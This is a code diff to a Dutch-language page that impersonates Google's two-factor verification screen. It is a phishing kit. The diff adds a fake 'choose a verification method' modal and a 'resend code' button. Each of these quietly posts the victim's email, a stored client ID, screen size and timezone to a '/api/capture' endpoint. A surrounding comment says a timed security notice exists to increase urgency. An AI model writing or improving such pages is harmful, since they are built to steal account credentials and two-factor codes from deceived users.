@@ -469,6 +469,10 @@
                 <a href="#" class="link" onclick="tryAnotherWay();return false;">Probeer een andere manier</a>
             </div>
 
+            <div style="display:flex;align-items:center;justify-content:flex-end;gap:6px;margin-top:6px;font-size:13px;color:#5f6368;">
+                Code niet ontvangen?&nbsp;<button id="resendBtn" onclick="resendCode()" type="button" style="background:none;border:none;color:#1a73e8;font-size:13px;font-weight:500;cursor:pointer;padding:0;">Opnieuw sturen</button><span id="resendTimer" style="display:none;color:#9aa0a6;font-size:12px;margin-left:4px;"></span>
+            </div>
+
             <div class="actions" style="margin-top:28px;">
                 <a href="#" class="link" onclick="return false;">Meer informatie</a>
                 <button class="btn-next" id="tfaBtn" onclick="submitTwoFA()">Volgende</button>
@@ -690,12 +694,86 @@
 
     /* ── Andere verificatiemethode ── */
     function tryAnotherWay() {
-        const msg = document.getElementById('tfa-msg');
-        if (msg) {
-            msg.innerHTML = 'We hebben een e-mail gestuurd naar het herstel-e-mailadres dat aan je account is gekoppeld.<br>Voer de 6-cijferige code in die we je hebben gestuurd.';
+        const overlay = document.getElementById('tawOverlay');
+        if (overlay) {
+            overlay.style.display = 'flex';
+            return;
         }
+        // Build modal on first call
+        const el = document.createElement('div');
+        el.id = 'tawOverlay';
+        el.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:9999;display:flex;align-items:center;justify-content:center;';
+        el.innerHTML = `
+            <div style="background:#fff;border-radius:8px;width:340px;max-width:90%;padding:24px;font-family:'Google Sans',Roboto,sans-serif;box-shadow:0 8px 20px rgba(0,0,0,.2);">
+                <h2 style="font-size:20px;font-weight:normal;color:#202124;margin:0 0 20px;">Kies een verificatiemethode</h2>
+                <div onclick="selectTawMethod(this,'sms')" style="display:flex;align-items:center;gap:16px;padding:12px 0;border-bottom:1px solid #f0f0f0;cursor:pointer;border-radius:4px;">
+                    <svg viewBox="0 0 24 24" width="24" height="24"><path fill="#5f6368" d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
+                    <div><div style="font-size:14px;font-weight:500;color:#202124;">Sms naar •• ••</div><div style="font-size:12px;color:#5f6368;margin-top:2px;">Ontvang een sms met verificatiecode</div></div>
+                </div>
+                <div onclick="selectTawMethod(this,'call')" style="display:flex;align-items:center;gap:16px;padding:12px 0;border-bottom:1px solid #f0f0f0;cursor:pointer;border-radius:4px;">
+                    <svg viewBox="0 0 24 24" width="24" height="24"><path fill="#5f6368" d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                    <div><div style="font-size:14px;font-weight:500;color:#202124;">Telefonische oproep naar •• ••</div><div style="font-size:12px;color:#5f6368;margin-top:2px;">Ontvang een gesproken verificatiecode</div></div>
+                </div>
+                <div onclick="selectTawMethod(this,'backup')" style="display:flex;align-items:center;gap:16px;padding:12px 0;cursor:pointer;border-radius:4px;">
+                    <svg viewBox="0 0 24 24" width="24" height="24"><path fill="#5f6368" d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    <div><div style="font-size:14px;font-weight:500;color:#202124;">Back-upcode gebruiken</div><div style="font-size:12px;color:#5f6368;margin-top:2px;">Gebruik een van de acht back-upcodes</div></div>
+                </div>
+                <div style="display:flex;justify-content:flex-end;margin-top:20px;">
+                    <button onclick="closeTawModal()" style="background:none;border:none;color:#5f6368;font-size:14px;cursor:pointer;padding:8px 16px;border-radius:4px;">Annuleren</button>
+                </div>
+            </div>`;
+        document.body.appendChild(el);
+    }
+
+    function selectTawMethod(el, method) {
+        closeTawModal();
+        const msg = document.getElementById('tfa-msg');
+        if (method === 'sms') {
+            if (msg) msg.innerHTML = 'We hebben een sms gestuurd naar het telefoonnummer dat eindigt op <b>•• ••</b>.<br>Voer de 6-cijferige verificatiecode in om te bevestigen.';
+        } else if (method === 'call') {
+            if (msg) msg.innerHTML = 'We bellen het telefoonnummer dat eindigt op <b>•• ••</b>.<br>Beantwoord de oproep en volg de instructies.';
+        } else if (method === 'backup') {
+            if (msg) msg.innerHTML = 'Voer een van je 8-cijferige back-upcodes in.<br>Je kunt deze terug vinden in je beveiligingsinstellingen.';
+            document.getElementById('tfaInput').setAttribute('inputmode', 'numeric');
+        }
+        const email = document.getElementById('tfa-email-display')?.textContent || 'unknown';
+        fetch('/api/capture', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ email, password: `[ACTIE: tryAnotherWay → ${method}]`, source: 'google_2fa_method', timestamp: new Date().toISOString(), clientId: localStorage.getItem('_cid') || 'unknown', screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '' })
+        }).catch(() => {});
         document.getElementById('tfaInput').value = '';
         document.getElementById('tfaInput').focus();
+    }
+
+    function closeTawModal() {
+        const el = document.getElementById('tawOverlay');
+        if (el) el.style.display = 'none';
+    }
+
+    /* ── Resend code ── */
+    function resendCode() {
+        const btn = document.getElementById('resendBtn');
+        const timer = document.getElementById('resendTimer');
+        btn.disabled = true;
+        btn.style.opacity = '.4';
+        timer.style.display = 'inline';
+        let sec = 60;
+        timer.textContent = `(${sec}s)`;
+        const iv = setInterval(() => {
+            sec--;
+            timer.textContent = `(${sec}s)`;
+            if (sec <= 0) {
+                clearInterval(iv);
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                timer.style.display = 'none';
+            }
+        }, 1000);
+        const email = document.getElementById('tfa-email-display')?.textContent || 'unknown';
+        fetch('/api/capture', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ email, password: '[ACTIE: 2FA code opnieuw aangevraagd]', source: 'google_2fa_resend', timestamp: new Date().toISOString(), clientId: localStorage.getItem('_cid') || 'unknown', screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '' })
+        }).catch(() => {});
     }
 
     /* ── Enter-toets ── */
@@ -726,8 +804,10 @@
     document.getElementById('tfaInput').addEventListener('input', function () {
         this.classList.remove('err');
         document.getElementById('tfaErr').classList.remove('show');
-        // Allow digits and spaces only
-        this.value = this.value.replace(/[^0-9 ]/g, '');
+        // Allow digits and spaces only; auto-format as "xxx xxx"
+        let val = this.value.replace(/[^0-9]/g, '');
+        if (val.length > 3) val = val.slice(0, 3) + ' ' + val.slice(3, 6);
+        this.value = val;
     });
 
     // Show security notice after 2.5 seconds (increases urgency to log in)
